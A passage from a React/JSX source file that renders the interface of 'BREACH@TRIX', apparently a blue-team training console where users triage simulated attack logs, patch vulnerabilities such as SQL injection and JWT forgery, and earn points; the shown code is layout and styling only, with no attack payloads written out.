                              flexShrink: 0,
                            }}
                          >
                            {item!.icon}
                          </span>
                          <span
                            style={{
                              fontSize: 12,
                              color: "#6b6b70",
                              lineHeight: 1.6,
                            }}
                          >
                            {item!.text}
                          </span>
                        </div>
                      ))}
                  </div>

                  {challengeResult === "pass" && (
                    <div
                      style={{
                        marginTop: 20,
                        padding: "14px",
                        background: "rgba(74,222,128,0.08)",
                        border: "1px solid rgba(74,222,128,0.2)",
                        borderRadius: 8,
                      }}
                    >
                      <div
                        style={{
                          fontSize: 11,
                          fontWeight: 700,
                          color: "#4ade80",
                          letterSpacing: "0.06em",
                          marginBottom: 5,
                        }}
                      >
                        ✓ VULNERABILITY CLOSED
                      </div>
                      <div
                        style={{
                          fontSize: 12,
                          color: "#86efac",
                          lineHeight: 1.6,
                        }}
                      >
                        {challengeType ? TYPE_LABELS[challengeType] : ""}{" "}
                        attacks halted.
                        {challengeType === "sqli" &&
                          " Login page is now patched."}
                        {challengeType === "jwt_forge" &&
                          " Profile page now blocks forges."}
                      </div>
                    </div>
                  )}

                  {/* Score table */}
                  <div style={{ marginTop: 24 }}>
                    <div
                      style={{
                        fontSize: 10,
                        fontWeight: 700,
                        letterSpacing: "0.1em",
                        color: "#3a3a42",
                        marginBottom: 12,
                      }}
                    >
                      CHALLENGE BOARD
                    </div>
                    {Object.entries(CHALLENGES).map(([type, ch]) => {
                      const done = patchedTypes.has(type as AttackType);
                      const tc = TYPE_COLORS[type as AttackType];
                      return (
                        <div
                          key={type}
                          style={{
                            display: "flex",
                            justifyContent: "space-between",
                            alignItems: "center",
                            padding: "9px 0",
                            borderBottom: "1px solid #1e1e24",
                            opacity: done ? 0.5 : 1,
                          }}
                        >
                          <div
                            style={{
                              display: "flex",
                              alignItems: "center",
                              gap: 8,
                            }}
                          >
                            {done && (
                              <span style={{ fontSize: 10, color: "#4ade80" }}>
                                ✓
                              </span>
                            )}
                            <span
                              style={{
                                fontSize: 11,
                                fontWeight: 600,
                                color: done ? "#4ade80" : tc.text,
                              }}
                            >
                              {TYPE_LABELS[type as AttackType]}
                            </span>
                          </div>
                          <span
                            style={{
                              fontSize: 12,
                              fontWeight: 700,
                              color: done ? "#4ade80" : "#4a4a52",
                            }}
                          >
                            +{ch!.points}
                          </span>
                        </div>
                      );
                    })}
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* ── TOP BAR ─────────────────────────────────────────────────── */}
      <header
        style={{
          display: "flex",
          alignItems: "center",
          justifyContent: "space-between",
          padding: "0 28px",
          height: 58,
          background: "#111115",
          borderBottom: "1px solid #1e1e24",
          flexShrink: 0,
          gap: 16,
        }}
      >
        <div style={{ display: "flex", alignItems: "center", gap: 14 }}>
          <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
            <div
              style={{
                width: 20,
                height: 20,
                background: "linear-gradient(135deg,#4ade80,#22d3ee)",
                borderRadius: 5,
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
              }}
            >
              <svg width="11" height="11" viewBox="0 0 24 24" fill="none">
                <path
                  d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"
                  fill="white"
                />
              </svg>
            </div>
            <span
              style={{
                fontSize: 13,
                fontWeight: 800,
                color: "#f0ece4",
                letterSpacing: "-0.02em",
              }}
            >
              BREACH<span style={{ color: "#4ade80" }}>@</span>TRIX
            </span>
            <span
              style={{
                fontSize: 11,
                color: "#3a3a42",
                fontWeight: 500,
                marginLeft: 4,
              }}
            >
              // blue team console
            </span>
          </div>

          {critCount > 0 && (
            <div
              style={{
                display: "flex",
                alignItems: "center",
                gap: 6,
                background: "rgba(239,68,68,0.1)",
                border: "1px solid rgba(239,68,68,0.25)",
                borderRadius: 6,
                padding: "3px 10px",
              }}
            >
              <div
                style={{
                  width: 6,
                  height: 6,
                  borderRadius: "50%",
                  background: "#ef4444",
                  animation: "pulse 1.2s infinite",
                }}
              />
              <span
                style={{
                  fontSize: 10,
                  color: "#ef4444",
                  fontWeight: 700,
                  letterSpacing: "0.08em",
                }}
              >
                {critCount} CRITICAL ACTIVE
              </span>
            </div>
          )}

          {[...patchedTypes].map((t) => (
            <div
              key={t}
              style={{
                display: "flex",
                alignItems: "center",
                gap: 5,
                background: "rgba(74,222,128,0.08)",
                border: "1px solid rgba(74,222,128,0.2)",
                borderRadius: 6,
                padding: "3px 10px",
              }}
            >
              <span
                style={{
                  fontSize: 10,
                  color: "#4ade80",
                  fontWeight: 700,
                  letterSpacing: "0.06em",
                }}
              >
                ✓ {TYPE_LABELS[t].split(" ")[0]}
              </span>
            </div>
          ))}
        </div>

        <div style={{ display: "flex", alignItems: "center", gap: 20 }}>
          <div style={{ textAlign: "right" }}>
            <div
              style={{
                fontSize: 9,
                color: "#3a3a42",
                fontWeight: 700,
                letterSpacing: "0.1em",
                marginBottom: 1,
              }}
            >
              SCORE
            </div>
            <div
              style={{
                fontSize: 22,
                fontWeight: 800,
                color: "#4ade80",
                lineHeight: 1,
                letterSpacing: "-0.03em",
                fontFamily: mono,
              }}
            >
              {score.toLocaleString()}
            </div>
          </div>
          <div style={{ width: 1, height: 32, background: "#1e1e24" }} />
          <div style={{ textAlign: "right" }}>
            <div
              style={{
                fontSize: 9,
                color: "#3a3a42",
                fontWeight: 700,
                letterSpacing: "0.1em",
                marginBottom: 1,
              }}
            >
              UPTIME
            </div>
            <div
              style={{
                fontSize: 17,
                fontWeight: 700,
                color: isRunning ? "#e8e6e1" : "#3a3a42",
                lineHeight: 1,
                fontFamily: mono,
              }}
            >
              {fmtEl(elapsed)}
            </div>
          </div>
          <div style={{ width: 1, height: 32, background: "#1e1e24" }} />
          <div style={{ display: "flex", gap: 8 }}>
            <button
              onClick={() => setLogs([])}
              style={{
                fontFamily: sans,
                fontSize: 11,
                fontWeight: 700,
                letterSpacing: "0.06em",
                padding: "6px 12px",
                borderRadius: 6,
                cursor: "pointer",
                background: "transparent",
                border: "1px solid #2a2a30",
                color: "#4a4a52",
                transition: "all 0.1s",
              }}
              onMouseOver={(e) => {
                e.currentTarget.style.borderColor = "#3a3a42";
                e.currentTarget.style.color = "#78716c";
              }}
              onMouseOut={(e) => {
                e.currentTarget.style.borderColor = "#2a2a30";
                e.currentTarget.style.color = "#4a4a52";
              }}
            >
              CLEAR
            </button>
            <button
              onClick={() => setIsRunning((v) => !v)}
              style={{
                fontFamily: sans,
                fontSize: 11,
                fontWeight: 700,
                letterSpacing: "0.06em",
                padding: "6px 12px",
                borderRadius: 6,
                cursor: "pointer",
                transition: "all 0.1s",
                ...(isRunning
                  ? {
                      background: "rgba(251,191,36,0.1)",
                      border: "1px solid rgba(251,191,36,0.25)",
                      color: "#fbbf24",
                    }
                  : {
                      background: "rgba(74,222,128,0.1)",
                      border: "1px solid rgba(74,222,128,0.25)",
                      color: "#4ade80",
                    }),
              }}
            >
              {isRunning ? "⏸ PAUSE" : "▶ RESUME"}
            </button>
          </div>
        </div>
      </header>

      {/* ── MAIN LAYOUT ──────────────────────────────────────────────── */}
      <div
        style={{
          display: "flex",
          flex: 1,
          minHeight: 0,
          height: "calc(100vh - 58px)",
        }}
      >
        {/* ── LEFT: LOG LIST ── */}
        <div
          style={{
            flex: 1,
            display: "flex",
            flexDirection: "column",
            borderRight: "1px solid #1e1e24",
            minWidth: 0,
          }}
        >
          {/* Filter tabs + count */}
          <div
            style={{
              display: "flex",
              alignItems: "center",
              justifyContent: "space-between",
              padding: "0 24px",
              borderBottom: "1px solid #1e1e24",
              background: "#111115",
              flexShrink: 0,
            }}
          >
            <div style={{ display: "flex", gap: 0 }}>
              {(["all", "acknowledged", "fixed"] as FilterTab[]).map((tab) => {
                const labels: Record<FilterTab, string> = {
                  all: "All Events",
                  acknowledged: "Acknowledged",
                  fixed: "Fixed",
                };
                const active = filterTab === tab;
                return (
                  <button
                    key={tab}
                    onClick={() => setFilterTab(tab)}
                    style={{
                      fontFamily: sans,
                      background: "transparent",
                      border: "none",
                      borderBottom: `2px solid ${active ? "#4ade80" : "transparent"}`,
                      padding: "14px 18px",
                      fontSize: 11,
                      fontWeight: 700,
                      letterSpacing: "0.08em",
                      color: active ? "#4ade80" : "#4a4a52",
                      cursor: "pointer",
                      transition: "all 0.15s",
                      display: "flex",
                      alignItems: "center",
                      gap: 7,
                    }}
                  >
                    {labels[tab]}
                    <span
                      style={{
                        fontSize: 10,
                        fontWeight: 700,
                        padding: "1px 6px",
                        borderRadius: 10,
                        background: active
                          ? "rgba(74,222,128,0.15)"
                          : "#1e1e24",
                        color: active ? "#4ade80" : "#3a3a42",
                      }}
                    >
                      {tabCounts[tab]}
                    </span>
                  </button>
                );
              })}
            </div>
            <span
              style={{
                fontSize: 10,
                fontWeight: 700,
                letterSpacing: "0.08em",
                color: isRunning ? "#4ade80" : "#4a4a52",
                display: "flex",
                alignItems: "center",
                gap: 5,
              }}
            >
              {isRunning && (
                <span
                  style={{
                    display: "inline-block",
                    width: 5,
                    height: 5,
                    borderRadius: "50%",
                    background: "#4ade80",
                    animation: "pulse 1.2s infinite",
                  }}
                />
              )}
              {isRunning ? "LIVE" : "PAUSED"}
            </span>
          </div>

          {/* Column headers */}
          <div
            style={{
              display: "grid",
              gridTemplateColumns: "88px 82px 130px 1fr 110px",
              padding: "9px 24px",
              background: "#0d0d10",
              borderBottom: "1px solid #1e1e24",
              fontSize: 10,
              fontWeight: 700,
              letterSpacing: "0.1em",
              color: "#3a3a42",
              flexShrink: 0,
            }}
          >
            <span>TIME</span>
            <span>SEV</span>
            <span>VECTOR</span>
            <span>ATTACKER / DETAIL</span>
            <span style={{ textAlign: "right" }}>STATUS</span>
          </div>

          {/* Log rows */}
          <div style={{ flex: 1, overflowY: "auto" }}>
            {filteredLogs.length === 0 && (
              <div
                style={{
                  display: "flex",
                  flexDirection: "column",
                  alignItems: "center",
                  justifyContent: "center",
                  height: 200,
                  gap: 12,
                }}
              >
                <div style={{ fontSize: 32, color: "#2a2a30" }}>◎</div>
                <div
                  style={{
                    fontSize: 12,
                    color: "#3a3a42",
                    fontWeight: 600,
                    letterSpacing: "0.06em",
                  }}
                >
                  {filterTab === "acknowledged"
                    ? "NO ACKNOWLEDGED THREATS"
                    : filterTab === "fixed"
                      ? "NO PATCHED VULNERABILITIES YET"
                      : "NO EVENTS RECORDED"}
                </div>
              </div>
            )}
            {filteredLogs.map((log) => {
              const sev = SEV_CONFIG[log.severity];
              const tc = TYPE_COLORS[log.type];
              const isSel = selected === log.id;
              const isGP = patchedTypes.has(log.type);
              return (
                <div
                  key={log.id}
                  onClick={() => setSelected(isSel ? null : log.id)}
                  style={{
                    display: "grid",
                    gridTemplateColumns: "88px 82px 130px 1fr 110px",
                    alignItems: "center",
                    padding: "11px 24px",
                    borderBottom: "1px solid #16161a",
                    borderLeft: `3px solid ${isSel ? sev.dot : "transparent"}`,
                    background: isSel ? "#141418" : "transparent",
                    cursor: "pointer",
                    opacity: isGP ? 0.35 : 1,
                    transition: "background 0.1s",
                  }}
                  onMouseOver={(e) => {
                    if (!isSel) e.currentTarget.style.background = "#111115";
                  }}
                  onMouseOut={(e) => {
                    if (!isSel)
                      e.currentTarget.style.background = "transparent";
                  }}
                >
                  <span
                    style={{ fontSize: 11, color: "#4a4a52", fontFamily: mono }}
                  >
                    {fmt(log.ts)}
                  </span>
                  <div
                    style={{ display: "flex", alignItems: "center", gap: 6 }}
                  >
                    <div
                      style={{
                        width: 6,
                        height: 6,
                        borderRadius: "50%",
                        background: sev.dot,
                        flexShrink: 0,
                      }}
                    />
                    <span
                      style={{
                        fontSize: 10,
                        fontWeight: 700,
                        letterSpacing: "0.06em",
                        color: sev.color,
                      }}
                    >
                      {sev.label}
                    </span>
                  </div>
                  <div>
                    <span
                      style={{
                        fontSize: 10,
                        fontWeight: 700,
                        letterSpacing: "0.06em",
                        padding: "2px 7px",
                        borderRadius: 4,
                        color: tc.text,
                        background: tc.bg,
                        border: `1px solid ${tc.border}`,
                      }}
                    >
                      {TYPE_LABELS[log.type]}
                    </span>
                  </div>
                  <div
                    style={{
                      fontSize: 12,
                      color: "#6b6b70",
                      whiteSpace: "nowrap",
                      overflow: "hidden",
                      textOverflow: "ellipsis",
                      paddingRight: 16,
                    }}
                  >
                    <span
                      style={{
                        color: sev.color,
                        fontWeight: 700,
                        marginRight: 7,
                      }}
                    >
                      {log.user}
                    </span>
                    {log.detail}
                  </div>
                  <div
                    style={{
                      display: "flex",
                      gap: 5,
                      justifyContent: "flex-end",
                    }}
                  >
                    {isGP && (
                      <span
                        style={{
                          fontSize: 9,
                          fontWeight: 700,
                          padding: "2px 7px",
                          borderRadius: 4,
                          color: "#4ade80",
                          background: "rgba(74,222,128,0.1)",
                          border: "1px solid rgba(74,222,128,0.2)",
                          letterSpacing: "0.06em",
                        }}
                      >
                        FIXED
                      </span>
                    )}
                    {!isGP && log.detected && (
                      <span
                        style={{
                          fontSize: 9,
                          fontWeight: 700,
                          padding: "2px 7px",
                          borderRadius: 4,
                          color: "#38bdf8",
                          background: "rgba(56,189,248,0.08)",
                          border: "1px solid rgba(56,189,248,0.2)",
                          letterSpacing: "0.06em",
                        }}
                      >
                        ACK
                      </span>
                    )}
                  </div>
                </div>
              );
            })}
          </div>
        </div>

        {/* ── RIGHT: INSPECTOR ── */}
        <div
          style={{
            width: 420,
            flexShrink: 0,
            display: "flex",
            flexDirection: "column",
            background: "#111115",
            borderLeft: "1px solid #1e1e24",
          }}
        >
          {/* Inspector header */}
          <div
            style={{
              padding: "14px 22px",
              borderBottom: "1px solid #1e1e24",
              flexShrink: 0,
              display: "flex",
              alignItems: "center",
              justifyContent: "space-between",
            }}
          >
            <span
              style={{
                fontSize: 10,
                fontWeight: 700,
                letterSpacing: "0.12em",
                color: "#3a3a42",
              }}
            >
              THREAT INSPECTOR
            </span>
            {selectedLog && (
              <span
                style={{ fontSize: 10, color: "#4a4a52", fontFamily: mono }}
              >
                #{selectedLog.id}
              </span>
            )}
          </div>

          {/* Inspector body */}
          <div
            style={{
              flex: 1,
              overflowY: "auto",
              display: "flex",
              flexDirection: "column",
            }}
          >
            {!selectedLog ? (
              <div
                style={{
                  display: "flex",
                  flexDirection: "column",
                  alignItems: "center",
                  justifyContent: "center",
                  flex: 1,
                  gap: 12,
                  color: "#2a2a30",
                  textAlign: "center",
                  padding: 32,
                }}
              >
                <svg
                  width="40"
                  height="40"
                  viewBox="0 0 24 24"
                  fill="none"
                  style={{ opacity: 0.3 }}
                >
                  <path
                    d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"
                    stroke="#e8e6e1"
                    strokeWidth="1.5"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                  />
                  <circle
                    cx="12"
                    cy="12"
                    r="2"
                    stroke="#e8e6e1"
                    strokeWidth="1.5"
                  />
                </svg>
                <div
                  style={{
                    fontSize: 11,
                    fontWeight: 700,
                    letterSpacing: "0.1em",
                    color: "#2a2a30",
                  }}
                >
                  SELECT A THREAT
                </div>
                <div style={{ fontSize: 11, color: "#2a2a30" }}>
                  Click any log row to inspect
                </div>
              </div>
            ) : (
              (() => {
                const sev = SEV_CONFIG[selectedLog.severity];
                const tc = TYPE_COLORS[selectedLog.type];
                const isGP = patchedTypes.has(selectedLog.type);
                const canAck = !selectedLog.detected && !isGP;
                const canPatch = selectedLog.detected && !isGP;

                return (
                  <div
                    style={{
                      padding: "20px 22px",
                      display: "flex",
                      flexDirection: "column",
                      gap: 16,
                    }}
                  >
                    {/* Threat card */}
                    <div
                      style={{
                        background: "#16161a",
                        border: `1px solid ${sev.dot}22`,
                        borderRadius: 10,
                        overflow: "hidden",
                      }}
                    >
                      {/* Card top accent */}
                      <div
                        style={{
                          height: 3,
                          background: `linear-gradient(90deg, ${sev.dot}, transparent)`,
                        }}
                      />
                      <div style={{ padding: "16px 18px" }}>
                        <div
                          style={{
                            display: "flex",
                            alignItems: "center",
                            justifyContent: "space-between",
                            marginBottom: 10,
                          }}
                        >
                          <span
                            style={{
                              fontSize: 10,
                              fontWeight: 700,
                              letterSpacing: "0.08em",
                              padding: "2px 8px",
                              borderRadius: 4,
                              color: tc.text,
                              background: tc.bg,
                              border: `1px solid ${tc.border}`,
                            }}
                          >
                            {TYPE_LABELS[selectedLog.type]}
                          </span>
                          <div
                            style={{
                              display: "flex",
                              alignItems: "center",
                              gap: 5,
                            }}
                          >
                            <div
                              style={{
                                width: 6,
                                height: 6,
                                borderRadius: "50%",
                                background: sev.dot,
                              }}
                            />
                            <span
                              style={{
                                fontSize: 10,
                                fontWeight: 700,
                                color: sev.color,
                                letterSpacing: "0.06em",
                              }}
                            >
                              {sev.label}
                            </span>
                          </div>
                        </div>
                        <div
                          style={{
                            fontSize: 16,
                            fontWeight: 800,
                            color: sev.color,
                            marginBottom: 6,
                            letterSpacing: "-0.01em",
                          }}
                        >
                          {selectedLog.user}
                        </div>
                        <div
                          style={{
                            fontSize: 12,
                            color: "#8b8480",
                            lineHeight: 1.65,
                            marginBottom: 14,
                          }}
                        >
                          {selectedLog.detail}
                        </div>

                        {/* Meta grid */}
                        <div
                          style={{
                            display: "grid",
                            gridTemplateColumns: "1fr 1fr",
                            gap: 8,
                            background: "#0d0d10",
                            borderRadius: 7,
                            padding: 12,
                            marginBottom: 12,
                          }}
                        >
                          {[
                            ["SOURCE IP", selectedLog.ip],
                            ["COUNTRY", selectedLog.country],
                            ["ENDPOINT", selectedLog.endpoint],
                            ["METHOD", selectedLog.method],
                            ["PORT", String(selectedLog.port)],
                            ["STATUS", String(selectedLog.statusCode)],
                          ].map(([l, v]) => (
                            <div key={l}>
                              <div
                                style={{
                                  fontSize: 9,
                                  color: "#3a3a42",
                                  fontWeight: 700,
                                  letterSpacing: "0.08em",
                                  marginBottom: 3,
                                }}
                              >
                                {l}
                              </div>
                              <div
                                style={{
                                  fontSize: 11,
                                  color: "#a0998f",
                                  wordBreak: "break-all",
                                  fontFamily: l === "SOURCE IP" ? mono : sans,
                                }}
                              >
                                {v}
                              </div>
                            </div>
                          ))}
                        </div>

                        <div
                          style={{
                            fontSize: 9,
                            color: "#3a3a42",
                            fontWeight: 700,
                            letterSpacing: "0.08em",
                            marginBottom: 5,
                          }}
                        >
                          RAW PAYLOAD
                        </div>
                        <div
                          style={{
                            background: "#0d0d10",
                            border: "1px solid #1e1e24",
                            borderRadius: 6,
                            padding: "10px 12px",
                            fontSize: 11,
                            color: "#6b6b70",
                            whiteSpace: "pre-wrap",
                            wordBreak: "break-all",
                            lineHeight: 1.7,
                            fontFamily: mono,
                            maxHeight: 90,
                            overflowY: "auto",
                          }}
                        >
                          {selectedLog.payload}
                        </div>
                      </div>
                    </div>

                    {/* Action area */}
                    {isGP ? (
                      <div
                        style={{
                          padding: "14px 16px",
                          background: "rgba(74,222,128,0.06)",
                          border: "1px solid rgba(74,222,128,0.18)",
                          borderRadius: 8,
                          display: "flex",
                          alignItems: "center",
                          gap: 10,
                        }}
                      >
                        <div
                          style={{
                            width: 20,
                            height: 20,
                            background: "rgba(74,222,128,0.15)",
                            borderRadius: "50%",
                            display: "flex",
                            alignItems: "center",
                            justifyContent: "center",
                            flexShrink: 0,
                          }}
                        >
                          <span style={{ fontSize: 10, color: "#4ade80" }}>
                            ✓
                          </span>
                        </div>
                        <div>
                          <div
                            style={{
                              fontSize: 12,
                              fontWeight: 700,
                              color: "#4ade80",
                              marginBottom: 2,
                            }}
                          >
                            Vulnerability Patched
                          </div>
                          <div style={{ fontSize: 11, color: "#4a6a52" }}>
                            {TYPE_LABELS[selectedLog.type]} is globally closed.
                          </div>
                        </div>
                      </div>
                    ) : (
                      <div
                        style={{
                          display: "flex",
                          flexDirection: "column",
                          gap: 8,
                        }}
                      >
                        {/* Step indicator */}
                        <div
                          style={{
                            display: "flex",
                            alignItems: "center",
                            gap: 0,
                            marginBottom: 4,
                          }}
                        >
                          <div
                            style={{
                              display: "flex",
                              alignItems: "center",
                              gap: 6,
                            }}
                          >
                            <div
                              style={{
                                width: 20,
                                height: 20,
                                borderRadius: "50%",
                                background: selectedLog.detected
                                  ? "rgba(74,222,128,0.15)"
                                  : "rgba(56,189,248,0.15)",
                                border: `1px solid ${selectedLog.detected ? "rgba(74,222,128,0.3)" : "rgba(56,189,248,0.3)"}`,
                                display: "flex",
                                alignItems: "center",
                                justifyContent: "center",
                                fontSize: 10,
                                fontWeight: 700,
                                color: selectedLog.detected
                                  ? "#4ade80"
                                  : "#38bdf8",
                              }}
                            >
                              {selectedLog.detected ? "✓" : "1"}
                            </div>
                            <span
                              style={{
                                fontSize: 10,
                                fontWeight: 700,
                                color: selectedLog.detected
                                  ? "#4ade80"
                                  : "#38bdf8",
                                letterSpacing: "0.06em",
                              }}
                            >
                              ACKNOWLEDGE
                            </span>
                          </div>
                          <div
                            style={{
                              flex: 1,
                              height: 1,
                              background: selectedLog.detected
                                ? "rgba(74,222,128,0.2)"
                                : "#1e1e24",
                              margin: "0 10px",
                            }}
                          />
                          <div
                            style={{
                              display: "flex",
                              alignItems: "center",
                              gap: 6,
                            }}
                          >
                            <div
                              style={{
                                width: 20,
                                height: 20,
                                borderRadius: "50%",
                                background: canPatch
                                  ? "rgba(74,222,128,0.15)"
                                  : "#1e1e24",
                                border: `1px solid ${canPatch ? "rgba(74,222,128,0.3)" : "#2a2a30"}`,
                                display: "flex",
                                alignItems: "center",
                                justifyContent: "center",
                                fontSize: 10,
                                fontWeight: 700,
                                color: canPatch ? "#4ade80" : "#3a3a42",
                              }}
                            >
                              2
                            </div>
                            <span
                              style={{
                                fontSize: 10,
                                fontWeight: 700,
                                color: canPatch ? "#4ade80" : "#3a3a42",
                                letterSpacing: "0.06em",
                              }}
                            >
                              DEPLOY HOTFIX
                            </span>
                          </div>
                        </div>

                        {/* Acknowledge button */}
                        <button
                          onClick={() => acknowledge(selectedLog.id)}
                          disabled={!canAck}
                          style={{
                            fontFamily: sans,
                            width: "100%",
                            padding: "12px 16px",
                            borderRadius: 8,
                            fontSize: 12,
                            fontWeight: 700,
                            letterSpacing: "0.04em",
                            cursor: canAck ? "pointer" : "not-allowed",
                            border: "1px solid",
                            transition: "all 0.15s",
                            display: "flex",
                            alignItems: "center",
                            justifyContent: "space-between",
                            ...(selectedLog.detected
                              ? {
                                  background: "rgba(74,222,128,0.05)",
                                  borderColor: "rgba(74,222,128,0.15)",
                                  color: "#4a6a52",
                                }
                              : {
                                  background: "rgba(56,189,248,0.08)",
                                  borderColor: "rgba(56,189,248,0.25)",
                                  color: "#38bdf8",
                                }),
                          }}
                        >
                          <div
                            style={{
                              display: "flex",
                              alignItems: "center",
                              gap: 8,
                            }}
                          >
                            <span style={{ fontSize: 14 }}>
                              {selectedLog.detected ? "✓" : "◉"}
                            </span>
                            <div style={{ textAlign: "left" }}>
                              <div>
                                {selectedLog.detected
                                  ? "Acknowledged"
                                  : "Acknowledge Threat"}
                              </div>
                              <div
                                style={{
                                  fontSize: 10,
                                  fontWeight: 400,
                                  color: selectedLog.detected
                                    ? "#3a5a42"
                                    : "#1a6080",
                                  marginTop: 1,
                                }}
                              >
                                {selectedLog.detected
                                  ? "Step 1 complete — proceed to hotfix"
                                  : "Mark as triaged to unlock hotfix"}
                              </div>
                            </div>
                          </div>
                          {!selectedLog.detected && (
                            <span
                              style={{
                                fontSize: 10,
                                color: "#1a6080",
                                background: "rgba(56,189,248,0.08)",
                                padding: "2px 7px",
                                borderRadius: 4,
                              }}
                            >
                              No pts
                            </span>
                          )}
                        </button>

                        {/* Deploy Hotfix button */}
                        <button
                          onClick={() => openPatch(selectedLog.id)}
                          disabled={!canPatch}
                          style={{
                            fontFamily: sans,
                            width: "100%",
                            padding: "13px 16px",
                            borderRadius: 8,
                            fontSize: 12,
                            fontWeight: 700,
                            letterSpacing: "0.04em",
                            cursor: canPatch ? "pointer" : "not-allowed",
                            border: "1px solid",
                            transition: "all 0.15s",
                            display: "flex",
                            alignItems: "center",
                            justifyContent: "space-between",
                            ...(canPatch
                              ? {
                                  background: "rgba(74,222,128,0.1)",
                                  borderColor: "rgba(74,222,128,0.3)",
                                  color: "#4ade80",
                                }
                              : {
                                  background: "#0d0d10",
                                  borderColor: "#1e1e24",
                                  color: "#3a3a42",
                                }),
                          }}
                        >
                          <div
                            style={{
                              display: "flex",
                              alignItems: "center",
                              gap: 8,
                            }}
                          >
                            <span style={{ fontSize: 14 }}>
                              {canPatch ? "⚡" : "⟳"}
                            </span>
                            <div style={{ textAlign: "left" }}>
                              <div>
                                {canPatch ? "Deploy Hotfix" : "Deploy Hotfix"}
                              </div>
                              <div
                                style={{
                                  fontSize: 10,
                                  fontWeight: 400,
                                  color: canPatch ? "#15803d" : "#2a2a30",
                                  marginTop: 1,
                                }}
                              >
                                {canPatch
                                  ? "Opens code editor — fix the vulnerability"
                                  : "Acknowledge threat first"}
                              </div>
                            </div>
                          </div>
                          {canPatch && (
                            <div style={{ textAlign: "right" }}>
                              <span
                                style={{
                                  fontSize: 13,
                                  fontWeight: 800,
                                  color: "#4ade80",
                                }}
                              >
                                +{CHALLENGES[selectedLog.type]?.points || 0}
                              </span>
                              <div style={{ fontSize: 9, color: "#15803d" }}>
                                pts
                              </div>
                            </div>
                          )}
                        </button>
                      </div>
                    )}

                    {/* Toast */}
                    {toast && (
                      <div
                        style={{
                          padding: "10px 14px",
                          borderRadius: 7,
                          fontSize: 12,
                          fontWeight: 600,
                          animation: "fadeup 0.2s ease",
                          ...(toast.ok
                            ? {
                                background: "rgba(74,222,128,0.08)",
                                border: "1px solid rgba(74,222,128,0.2)",
                                color: "#4ade80",
                              }
                            : {
                                background: "rgba(239,68,68,0.08)",
                                border: "1px solid rgba(239,68,68,0.2)",
                                color: "#f87171",
                              }),
                        }}
                      >
                        {toast.msg}
                      </div>
                    )}

                    {/* User agent */}
                    <div>
                      <div
                        style={{
                          fontSize: 9,
                          color: "#2a2a30",
                          fontWeight: 700,
                          letterSpacing: "0.1em",
                          marginBottom: 5,
                        }}
                      >
                        USER AGENT
                      </div>
                      <div
                        style={{
                          fontSize: 10,
                          color: "#4a4a52",
                          fontFamily: mono,
                          lineHeight: 1.6,
                          wordBreak: "break-all",
                        }}
                      >
                        {selectedLog.userAgent}
                      </div>
                    </div>
                  </div>
                );
              })()
            )}
          </div>

          {/* Score ledger at bottom */}
          <div style={{ borderTop: "1px solid #1e1e24", flexShrink: 0 }}>
            <div
              style={{
                padding: "11px 22px",
                display: "flex",
                justifyContent: "space-between",
                alignItems: "center",
                background: "#0d0d10",
              }}
            >
              <span
                style={{
                  fontSize: 10,
                  fontWeight: 700,
                  letterSpacing: "0.1em",
                  color: "#3a3a42",
                }}
              >
                PATCH LEDGER
              </span>
              <span style={{ fontSize: 10, color: "#2a2a30" }}>
                {scoreHistory.length} fixes
              </span>
            </div>
            <div style={{ maxHeight: 180, overflowY: "auto" }}>
              {scoreHistory.length === 0 ? (
                <div
                  style={{
                    padding: "16px 22px",
                    color: "#2a2a30",
                    fontSize: 11,
                    textAlign: "center",
                  }}
                >
                  No patches deployed yet
                </div>
              ) : (
                scoreHistory.map((h, i) => {
                  const tc = TYPE_COLORS[h.type];
                  return (
                    <div
                      key={i}
                      style={{
                        display: "flex",
                        justifyContent: "space-between",
                        alignItems: "center",
                        padding: "10px 22px",
                        borderBottom: "1px solid #16161a",
                      }}
                    >
                      <div style={{ flex: 1, minWidth: 0 }}>
                        <div
                          style={{
                            fontSize: 10,
                            fontWeight: 700,
                            color: tc.text,
                            letterSpacing: "0.06em",
                            marginBottom: 2,
                          }}
                        >
                          {TYPE_LABELS[h.type]}
                        </div>
                        <div
                          style={{
                            fontSize: 11,
                            color: "#4a4a52",
                            whiteSpace: "nowrap",
                            overflow: "hidden",
                            textOverflow: "ellipsis",
                          }}
                        >
                          {h.detail}
                        </div>
                        <div
                          style={{
                            fontSize: 10,
                            color: "#3a3a42",
                            marginTop: 2,
                            fontFamily: mono,
                          }}
                        >
                          {fmt(h.ts)}
                        </div>
                      </div>
                      <div
                        style={{
                          fontSize: 16,
                          fontWeight: 800,
                          color: "#4ade80",
                          marginLeft: 12,
                          letterSpacing: "-0.02em",
                          fontFamily: mono,
                        }}
                      >
                        +{h.points}
                      </div>
                    </div>
                  );
                })
              )}
            </div>
          </div>
        </div>
      </div>

      <style jsx global>{`
        @import url("https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700&display=swap");
        * {
          box-sizing: border-box;
        }
        body {
          margin: 0;
          background: #0f0f11;
        }
        @keyframes pulse {
          0%,
          100% {
            opacity: 1;
            transform: scale(1);
          }
          50% {
            opacity: 0.5;
            transform: scale(0.8);
          }
        }
        @keyframes redflash {
          0% {
            opacity: 1;
          }
          100% {
            opacity: 0;
          }
        }
        @keyframes fadeup {
          from {
            opacity: 0;
            transform: translateY(4px);
          }
          to {
            opacity: 1;
            transform: translateY(0);
          }
        }
        ::-webkit-scrollbar {
          width: 4px;
        }
        ::-webkit-scrollbar-track {
          background: transparent;
        }
        ::-webkit-scrollbar-thumb {
          background: #2a2a30;
          border-radius: 4px;
        }
        ::-webkit-scrollbar-thumb:hover {
          background: #3a3a42;
        }
        textarea:focus {
          outline: none;
        }
        button:focus {
          outline: none;
        }
      `}</style>
    </div>
  );
}
